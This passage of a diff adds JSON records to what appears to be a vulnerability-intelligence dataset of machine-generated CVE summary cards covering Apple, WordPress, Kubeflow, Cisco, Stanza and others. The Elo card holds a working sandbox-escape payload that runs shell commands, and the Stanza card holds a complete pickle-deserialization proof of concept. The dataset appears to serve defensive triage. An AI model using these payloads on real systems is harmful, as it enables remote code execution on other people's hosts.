+    "Content_Hash": "f5f5fb50dd473784b205da7f97bd207f78c8f97dd5286d68682725d840ee9eed",
+    "chunk_ids": [
+      "nvd-cve-2026-96581::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-02T07:35:44.816309+00:00",
+    "card": {
+      "mechanism": "The vulnerability in ash-project ash allows a user to bypass authorization by supplying a user-controlled key, enabling them to read, overwrite, and take over records from another tenant through an upserting create action.",
+      "impact": "An attacker can gain unauthorized access to and modify records of another tenant, affecting versions 1.22.0 before 3.37.2.",
+      "testing_syntax": [],
+      "remediation": "Upgrade to version 3.37.2 or later to mitigate this vulnerability.",
+      "references": [
+        "https://cna.erlef.org/cves/CVE-2026-96581.html",
+        "https://github.com/ash-project/ash/commit/2333d01ddf37e5909769a513059b27e3183331c5",
+        "https://github.com/ash-project/ash/commit/c9f0cdb31e7c084def05f3f5be69dd7bb7721754",
+        "https://github.com/ash-project/ash/security/advisories/GHSA-vw7c-67pf-gh96",
+        "https://osv.dev/vulnerability/EEF-CVE-2026-96581"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 8,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-116232",
+    "CVE_ID": "CVE-2026-116232",
+    "Title": "CVE-2026-116232 - A weakness has been identified in Oray Pugongying X5 Pro 7.6.1. This affects the function ...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-116232",
+    "Content_Hash": "d9cf8fc2a5bbbe6b51040f4638c195cb97c9527a2288efd7de8e5c32ce373b86",
+    "chunk_ids": [
+      "nvd-cve-2026-116232::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-02T07:35:55.418957+00:00",
+    "card": {
+      "mechanism": "A weakness in the SNMP Handler component of Oray Pugongying X5 Pro 7.6.1 allows remote attackers to manipulate the 'info.community' argument, leading to CRLF injection.",
+      "impact": "An attacker can exploit this vulnerability remotely to inject commands, potentially leading to high impact on confidentiality, integrity, and availability. Affected versions include 7.6.1.",
+      "testing_syntax": [],
+      "remediation": "Update to a version of Oray Pugongying X5 Pro that addresses this vulnerability. If no update is available, consider disabling the SNMP Handler or applying network-level mitigations to restrict access.",
+      "references": [
+        "https://app.notion.com/p/Oray-Pgyer-X5-Pro-Router-7-6-1-A-Community-Newline-Makes-snmpd-Run-Commands-as-Root-3ea797159f1580f3bae8c6e7d8b91d1f",
+        "https://vuldb.com/cve/CVE-2026-116232",
+        "https://vuldb.com/submit/1005079",
+        "https://vuldb.com/vuln/426281",
+        "https://vuldb.com/vuln/426281/cti",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-116232"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 8,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "apple-149225",
+    "CVE_ID": null,
+    "Title": "Apple Security Release: iOS 18.7.11 and iPadOS 18.7.11",
+    "Source_URL": "https://support.apple.com/en-us/149225",
+    "Content_Hash": "f9c98dc6496a7b9a2ae919eeb485eedc82c33463ffe8da5123ff18ad8f5e581d",
+    "chunk_ids": [
+      "apple-149225::t1::000",
+      "apple-149225::t1::001"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-02T07:50:17.495825+00:00",
+    "card": {
+      "mechanism": "The Audio vulnerability involves a logic issue that could allow an app to leak sensitive user information. The CoreGraphics vulnerability is an out-of-bounds write issue that could lead to arbitrary code execution when processing a maliciously crafted file. The CoreMedia vulnerability is an access issue that could allow a malicious app to access the camera without user permission.",
+      "impact": "The Audio vulnerability affects iOS 18.7.11 and iPadOS 18.7.11, allowing an app to leak sensitive user information. The CoreGraphics vulnerability affects versions of iOS before iOS 27, potentially leading to arbitrary code execution. The CoreMedia vulnerability affects iOS 18.7.11 and iPadOS 18.7.11, allowing a malicious app to access the camera without user permission.",
+      "testing_syntax": [],
+      "remediation": "Update to the latest version of iOS and iPadOS to address these vulnerabilities. Ensure that all apps are from trusted sources and review app permissions regularly.",
+      "references": [
+        "https://support.apple.com/en-us/149225",
+        "https://support.apple.com/content/dam/edam/applecare/images/en_US/otherassets/security/149225.json",
+        "https://support.apple.com/en-us/100100",
+        "https://www.cve.org/About/Overview",
+        "https://support.apple.com/en-us/102549",
+        "https://support.apple.com/103190"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 8,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "ghsa-ghsa-8fmv-6rg5-5924",
+    "CVE_ID": "CVE-2026-118761",
+    "Title": "[GO] Kubeflow Pipelines: Pipeline archive upload allows decompression bomb to exhaust server memory",
+    "Source_URL": "https://github.com/advisories/GHSA-8fmv-6rg5-5924",
+    "Content_Hash": "d2adc05f22e25b39670196295d034e10bc9e4a0f99bf949e310dadaa8d695e56",
+    "chunk_ids": [
+      "ghsa-ghsa-8fmv-6rg5-5924::t1::000",
+      "ghsa-ghsa-8fmv-6rg5-5924::t1::001",
+      "ghsa-ghsa-8fmv-6rg5-5924::t1::002"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-02T07:50:31.486155+00:00",
+    "card": {
+      "mechanism": "The Kubeflow Pipelines API server decompresses uploaded pipeline archives without adequately bounding the expanded data, allowing a small ZIP or gzip-compressed tar archive to consume large amounts of memory.",
+      "impact": "An attacker can exhaust the API server's memory, potentially causing service interruption. Versions through 2.17.3 are affected.",
+      "testing_syntax": [],
+      "remediation": "Upgrade the API server to Kubeflow Pipelines 2.18.0. Until upgrading, restrict access to upload and import endpoints and apply deployment-level request and resource controls.",
+      "references": [
+        "https://github.com/advisories/GHSA-8fmv-6rg5-5924",
+        "https://github.com/kubeflow/pipelines/releases/tag/2.18.0",
+        "https://github.com/kubeflow/pipelines/pull/14171",
+        "https://github.com/kubeflow/pipelines/pull/14186",
+        "https://bugbunny.ai",
+        "https://github.com/Ayush-kathil",
+        "https://github.com/jeffspahr",
+        "https://github.com/BrianWillows"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 10,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "apple-149521",
+    "CVE_ID": null,
+    "Title": "Apple Security Release: macOS Golden Gate 27.2",
+    "Source_URL": "https://support.apple.com/en-us/149521",
+    "Content_Hash": "1bd4531d59a8d8ba75b4e8c0658501f1e79911cd2b311e22a5699ddac672f5bb",
+    "chunk_ids": [
+      "apple-149521::t1::000",
+      "apple-149521::t1::001",
+      "apple-149521::t1::002",
+      "apple-149521::t1::014",
+      "apple-149521::t1::017",
+      "apple-149521::t1::020",
+      "apple-149521::t1::022",
+      "apple-149521::t1::023"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-02T07:50:47.676953+00:00",
+    "card": {
+      "mechanism": "The Accelerate Framework in macOS Golden Gate 27.2 contains an out-of-bounds write issue that can be triggered by processing a maliciously crafted image.",
+      "impact": "An attacker can cause unexpected app termination by processing a maliciously crafted image. This affects macOS Golden Gate 27.2.",
+      "testing_syntax": [],
+      "remediation": "Apple has addressed this issue with improved bounds checking. Ensure your system is updated to the latest version.",
+      "references": [
+        "https://support.apple.com/en-us/149521",
+        "https://support.apple.com/content/dam/edam/applecare/images/en_US/otherassets/security/149521.json"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 3,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "apple-149589",
+    "CVE_ID": null,
+    "Title": "Apple Security Release: Xcode 27.2",
+    "Source_URL": "https://support.apple.com/en-us/149589",
+    "Content_Hash": "1c412b043e4085880625bfcf9579cccf0c45deb5ccb008cc7c67276d1b70c20a",
+    "chunk_ids": [
+      "apple-149589::t1::000",
+      "apple-149589::t1::001"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-02T07:50:54.779921+00:00",
+    "card": {
+      "mechanism": "The CoreDevice component in Xcode 27.2 contains a flaw where an app can read arbitrary files due to improper handling of symlinks. The Instruments component has an authorization issue that allows an app to access sensitive user data.",
+      "impact": "An attacker can exploit these vulnerabilities to read arbitrary files and access sensitive user data on affected versions of Xcode 27.2 running on macOS Tahoe 26.6 and later.",
+      "testing_syntax": [],
+      "remediation": "Apple has addressed these issues in Xcode 27.2 by improving symlink handling and state management. Ensure you update to the latest version of Xcode.",
+      "references": [
+        "https://support.apple.com/en-us/149589",
+        "https://support.apple.com/content/dam/edam/applecare/images/en_US/otherassets/security/149589.json",
+        "https://support.apple.com/en-us/100100",
+        "https://www.cve.org/About/Overview",
+        "https://support.apple.com/en-us/102549",
+        "https://support.apple.com/103190"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 8,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-119977",
+    "CVE_ID": "CVE-2026-119977",
+    "Title": "CVE-2026-119977 - WordPress WordPress Core Time-of-check Time-of-use (TOCTOU) Race Condition Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-119977",
+    "Content_Hash": "497eddeadadbe9ea990523813ece3aee6a401934c7869243ad6f7b064ba49ac2",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-119977::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-04T14:13:27.258923+00:00",
+    "card": {
+      "mechanism": "The vulnerability in WordPress Core is a time-of-check time-of-use (TOCTOU) race condition that arises from predictable, web-accessible staging paths used during full-package core upgrades.",
+      "impact": "Unauthenticated attackers can exploit this vulnerability to execute code on the server during the upgrade window. This affects WordPress Core versions up to and including the version with the predictable staging paths.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by WordPress in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with CISA’s ‘Forensics Triage Requirements’ and follow the applicable BOD 26-04 guidance for cloud services.",
+      "references": [
+        "https://wordpress.org/news/2026/10/wordpress-7-1-4",
+        "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-470-713-unauthenticated-upgrade-window-staged-installer-remote-code-execution",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-119977"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-115968",
+    "CVE_ID": "CVE-2026-115968",
+    "Title": "CVE-2026-115968 - Deserialization of Untrusted Data vulnerability in Ultimate Member Ultimate Member ultimat...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-115968",
+    "Content_Hash": "33bad1aab49e2aba82c527072a62f26dedddb303e59e15c597412e81790d4da2",
+    "chunk_ids": [
+      "nvd-cve-2026-115968::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-04T14:13:43.969676+00:00",
+    "card": {
+      "mechanism": "The vulnerability arises from the deserialization of untrusted data in the Ultimate Member plugin, allowing an attacker to inject arbitrary PHP objects.",
+      "impact": "An attacker can exploit this vulnerability to perform object injection, potentially leading to high impact consequences such as full control over the application. This affects Ultimate Member versions up to and including 2.13.1.",
+      "testing_syntax": [],
+      "remediation": "Update the Ultimate Member plugin to a version later than 2.13.1 to mitigate this vulnerability.",
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-115968",
+        "https://patchstack.com/database/wordpress/plugin/ultimate-member/vulnerability/wordpress-ultimate-member-plugin-2-13-1-php-object-injection-vulnerability?_s_id=cve"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 4,
+      "failures": [],
+      "attempts": 2
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "ghsa-ghsa-33r5-xmm8-v6x5",
+    "CVE_ID": "CVE-2026-44267",
+    "Title": "[NPM] Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access",
+    "Source_URL": "https://github.com/advisories/GHSA-33r5-xmm8-v6x5",
+    "Content_Hash": "b0008b82d2c54e11aaf79e7d36bc3cf1aaf71f4ae97d656e1a78b4d7bd5e4e3e",
+    "chunk_ids": [
+      "ghsa-ghsa-33r5-xmm8-v6x5::t1::000",
+      "ghsa-ghsa-33r5-xmm8-v6x5::t1::001",
+      "ghsa-ghsa-33r5-xmm8-v6x5::t2::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-04T14:13:58.732863+00:00",
+    "card": {
+      "mechanism": "The Elo JavaScript emitter allows unfiltered access to the `.constructor` member, which can be used to execute arbitrary code in the host JavaScript runtime. This is due to the lack of property name filtering in the `member_access` handler and the unescaped property names in the emitted JavaScript.",
+      "impact": "An unauthenticated attacker can achieve remote code execution (RCE) on CI/DevOps hosts, Node.js applications, and the browser playground. This affects versions of `npm:@enspirit/elo` up to and including the commit `749af7b`.",
+      "testing_syntax": [
+        "({}).constructor.constructor('return this.constructor.constructor(\\'return process\\')().mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()')()"
+      ],
+      "remediation": "Apply the patch to `src/transform.ts` to filter out dangerous property names, such as `constructor`. Ensure all integrations are updated to the latest version of `npm:@enspirit/elo`.",
+      "references": [
+        "https://github.com/advisories/GHSA-33r5-xmm8-v6x5"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 3,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "ghsa-ghsa-gh9r-c94j-cmp5",
+    "CVE_ID": "CVE-2026-115878",
+    "Title": "[PIP] Stanza: RCE via pickle deserialization in the lemmatizer",
+    "Source_URL": "https://github.com/advisories/GHSA-gh9r-c94j-cmp5",
+    "Content_Hash": "02dbd096be92b1046192daafc3b2567d7380f1cc835a8afa8065ff97421b17a9",
+    "chunk_ids": [
+      "ghsa-ghsa-gh9r-c94j-cmp5::t1::000",
+      "ghsa-ghsa-gh9r-c94j-cmp5::t1::001",
+      "ghsa-ghsa-gh9r-c94j-cmp5::t1::002",
+      "ghsa-ghsa-gh9r-c94j-cmp5::t2::000",
+      "ghsa-ghsa-gh9r-c94j-cmp5::t2::001",
+      "ghsa-ghsa-gh9r-c94j-cmp5::t2::002"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-04T14:14:11.101138+00:00",
+    "card": {
+      "mechanism": "The lemmatizer in Stanza versions 1.14.0 and later stores the `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field. When loading a checkpoint, the `Trainer.load` function uses an unrestricted `pickle.loads` to deserialize the data, allowing an attacker to execute arbitrary code by supplying a maliciously crafted `.pt` file.",
+      "impact": "An attacker can achieve remote code execution (RCE) by providing a malicious lemmatizer checkpoint file. This affects Stanza version 1.14.0 and later when used with PyTorch 2.13.0 and CPython 3.13.7.",
+      "testing_syntax": [
+        "import gzip, io, os, pickle, tempfile, torch\nfrom stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POS\n\nMARKER = os.path.join(tempfile.gettempdir(), \"stanza_lemma_poc_pwned\")\n\nclass Payload:\n    def __reduce__(self):\n        return (os.system, (\"id > %s 2>&1; echo executed_by=$(whoami) >> %s\" % (MARKER, MARKER),))\n\nbuf = io.BytesIO()\nwith gzip.GzipFile(fileobj=buf, mode=\"wb\") as gz:        # same shape as _pack_pos_dict()\n    gz.write(pickle.dumps(Payload(), protocol=4))\n\nckpt = {\"dicts\": buf.getvalue(), \"dicts_version\": _DICTS_VERSION_POS}\npt = os.path.join(tempfile.gettempdir(), \"evil_lemma.pt\")\ntorch.save(ckpt, pt, _use_new_zipfile_serialization=False)\n\nloaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact\n_unpack_pos_dict(loaded[\"dicts\"])                            # == trainer.py:378 -> command runs\nprint(\"pwned:\", open(MARKER).read().strip())"
+      ],
+      "remediation": "To mitigate this vulnerability, use the `RestrictedUnpickler` from `stanza/models/common/doc.py` to deserialize the inner stream, which allowlists only `tuple`, `list`, and `dict`. This ensures that only legitimate `pos_dict` structures are loaded.",
+      "references": [
+        "https://github.com/advisories/GHSA-gh9r-c94j-cmp5"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-105420",
+    "CVE_ID": "CVE-2026-105420",
+    "Title": "CVE-2026-105420 - Wing FTP Server does not verify user's base folder. An attacker with admin privileges can ...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-105420",
+    "Content_Hash": "d6d74e0c5bb9f4c415fd05bfbf6cbc6607daf1ea7e8c53c24a1ce1ba375c8364",
+    "chunk_ids": [
+      "nvd-cve-2026-105420::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-04T14:14:31.847501+00:00",
+    "card": {
+      "mechanism": "Wing FTP Server does not verify the user's base folder, allowing an attacker with admin privileges to add user directories via scripts, which can escape the base folder.",
+      "impact": "This flaw allows the attacker to write files on the system, potentially leading to remote code execution with process owner privileges. Versions prior to 8.2.6 are affected.",
+      "testing_syntax": [],
+      "remediation": "Upgrade to Wing FTP Server version 8.2.6 or later to fix this vulnerability.",
+      "references": [
+        "https://cert.pl/en/posts/2026/10/CVE-2026-105420",
+        "https://www.wftpserver.com/"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-123039",
+    "CVE_ID": "CVE-2026-123039",
+    "Title": "CVE-2026-123039 - Check Point Multiple Products Incorrect Permission Assignment for Critical Resource Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-123039",
+    "Content_Hash": "1a82cfcc34383cafecad0f02bb55886ec43d8678b07e01cfd4a09b9f5fd75fb8",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-123039::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:41:42.151682+00:00",
+    "card": {
+      "mechanism": "The vulnerability arises from incorrect permission assignment for critical resources in Check Point products, where the Gaia OS DynamicCLI daemon runs as root and listens on a world-writable local socket without authenticating connecting processes.",
+      "impact": "An authenticated local user can send a command to the socket and have it executed as root, affecting Check Point Firewall, Multi-Domain Security Management Server, Scalable Platforms, Security Gateway, and Security Management Server.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and ensure compliance with CISA’s BOD 26-04 guidance. Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "https://support.checkpoint.com/results/sk/sk1000362",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-123039"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 2
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-114713",
+    "CVE_ID": "CVE-2026-114713",
+    "Title": "CVE-2026-114713 - UnrealIRCd Improper Neutralization of Delimiters Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-114713",
+    "Content_Hash": "1c95529ff3583d31c141e453f2c60666590e723684b8744220f8a3663138b5c0",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-114713::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:41:53.218414+00:00",
+    "card": {
+      "mechanism": "The vulnerability in UnrealIRCd allows any user on a network with two or more linked servers to inject server-to-server commands due to improper neutralization of delimiters.",
+      "impact": "An attacker can execute server-to-server commands with server authority, affecting versions of UnrealIRCd that are not patched.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations provided by the vendor and follow CISA’s BOD 26-04 guidance for prioritizing security updates. Discontinue use of the product if mitigations are unavailable.",
+      "references": [
+        "https://forums.unrealircd.org/viewtopic.php?t=9487",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-114713"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-124194",
+    "CVE_ID": "CVE-2026-124194",
+    "Title": "CVE-2026-124194 - Microsoft Office Outlook Missing User Interaction for Potentially Unsafe Action Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-124194",
+    "Content_Hash": "62127a97791f0a1f7f7de271688595aed096d3e237181046423daf7f34191638",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-124194::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:41:58.165136+00:00",
+    "card": {
+      "mechanism": "Microsoft Office Outlook contains a vulnerability where it fails to prompt the user for confirmation before performing potentially unsafe actions, allowing an attacker to perform spoofing over a network.",
+      "impact": "An attacker can exploit this vulnerability to perform spoofing attacks, affecting versions of Microsoft Office Outlook that have not been patched.",
+      "testing_syntax": [],
+      "remediation": "Apply the mitigations and updates provided by Microsoft in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with CISA’s ‘Forensics Triage Requirements’ and patching guidelines.",
+      "references": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2026-124194",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-124194"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 3,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-20320",
+    "CVE_ID": "CVE-2026-20320",
+    "Title": "CVE-2026-20320 - Cisco BroadWorks Improper Restriction of XML External Entity Reference Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-20320",
+    "Content_Hash": "6a4974272569fb01610ecbc97662f2d8029fd23f0236e2b5cb9129fcf42dfa8f",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-20320::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:42:02.150787+00:00",
+    "card": {
+      "mechanism": "Cisco BroadWorks contains an improper restriction of XML external entity reference (XXE) vulnerability, allowing an unauthenticated, remote attacker to exploit this flaw.",
+      "impact": "An attacker can read sensitive configuration information on an affected system. This vulnerability affects Cisco BroadWorks.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and CISA’s BOD 26-04 guidance. Ensure compliance with patching guidelines and evaluate internet exposure of assets.",
+      "references": [
+        "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-bworks-xxe-uwUd7CEt",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-20320"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 5,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "cisa-kev-cve-2026-111793",
+    "CVE_ID": "CVE-2026-111793",
+    "Title": "CVE-2026-111793 - Openwave Messaging Limited Webtop Media Transcoder Incorrect Resource Transfer Between Spheres Vulnerability",
+    "Source_URL": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2026-111793",
+    "Content_Hash": "ae4004fcc6c1be73b966587a7e3e66199404704ccb81bb3cddf7d4b30907d697",
+    "chunk_ids": [
+      "cisa-kev-cve-2026-111793::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:42:07.233714+00:00",
+    "card": {
+      "mechanism": "The Openwave Messaging Limited Webtop Media Transcoder contains a vulnerability that allows an authenticated user to process and convert unintended document types by bypassing the Webmail experience.",
+      "impact": "An authenticated user can exploit this vulnerability to process and convert unintended document types, potentially leading to unauthorized access to resources. This affects the Webtop Media Transcoder.",
+      "testing_syntax": [],
+      "remediation": "Apply mitigations in accordance with vendor instructions and follow CISA’s BOD 26-04 guidance for prioritizing security updates. If mitigations are unavailable, discontinue use of the product.",
+      "references": [
+        "https://github.com/GISOpenwave/security-advisories-public/blob/main/CAN-2026-2032674.md",
+        "https://jvn.jp/en/vu/JVNVU93403064/",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk",
+        "https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-111793"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 6,
+      "failures": [],
+      "attempts": 1
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "nvd-cve-2026-124577",
+    "CVE_ID": "CVE-2026-124577",
+    "Title": "CVE-2026-124577 - A weakness has been identified in Intelbras SG 2404 PoE L2+ 1.00.70/1.00.72. The affected ...",
+    "Source_URL": "https://nvd.nist.gov/vuln/detail/CVE-2026-124577",
+    "Content_Hash": "6a234be2cb6074dd3b3a676d0604097f74407dbe1c15d110eaa103f1ed20282a",
+    "chunk_ids": [
+      "nvd-cve-2026-124577::t1::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:42:13.355216+00:00",
+    "card": {
+      "mechanism": "A weakness exists in the Web Management Interface of Intelbras SG 2404 PoE L2+ versions 1.00.70 and 1.00.72, specifically in an unknown function of the file /EXCU_SHELL, which can lead to improper authentication.",
+      "impact": "An attacker can remotely exploit this vulnerability to gain unauthorized access to the device. Versions 1.00.70 and 1.00.72 are affected.",
+      "testing_syntax": [],
+      "remediation": "Upgrade to version 1.00.74 to fix this issue.",
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-124577",
+        "https://vuldb.com/cve/CVE-2026-124577",
+        "https://vuldb.com/submit/1038184",
+        "https://vuldb.com/vuln/432923",
+        "https://vuldb.com/vuln/432923/cti"
+      ]
+    },
+    "verification": {
+      "passed": true,
+      "status": "PASSED",
+      "checks_run": 9,
+      "failures": [],
+      "attempts": 2
+    },
+    "status": "PASSED"
+  },
+  {
+    "Item_ID": "ghsa-ghsa-qfx6-q44v-9qqw",
+    "CVE_ID": "CVE-2026-62297",
+    "Title": "[NPM] ag-psd can exhaust memory when parsing crafted PSD dimensions",
+    "Source_URL": "https://github.com/advisories/GHSA-qfx6-q44v-9qqw",
+    "Content_Hash": "4057a065697a5cdbbae240dfbb9b711d2d7b89daa07dab0a9ca0137b4d1a6169",
+    "chunk_ids": [
+      "ghsa-ghsa-qfx6-q44v-9qqw::t1::000",
+      "ghsa-ghsa-qfx6-q44v-9qqw::t2::000"
+    ],
+    "retrieval": "qdrant",
+    "model": "openrouter/qwen/qwen-2.5-72b-instruct",
+    "generated_at": "2026-11-16T07:42:23.020225+00:00",
+    "card": {
+      "mechanism": "The readPsd() function in ag-psd allocates memory based on the declared header dimensions of a PSD file before validating the actual data, allowing a small crafted PSD file to trigger a large memory allocation.",
+      "impact": "An attacker can cause a remote Denial of Service (DoS) by sending a small, crafted PSD file that forces the application to allocate a large amount of memory, leading to an out-of-memory (OOM) condition and process termination. This affects ag-psd version 30.2.0.",
+      "testing_syntax": [
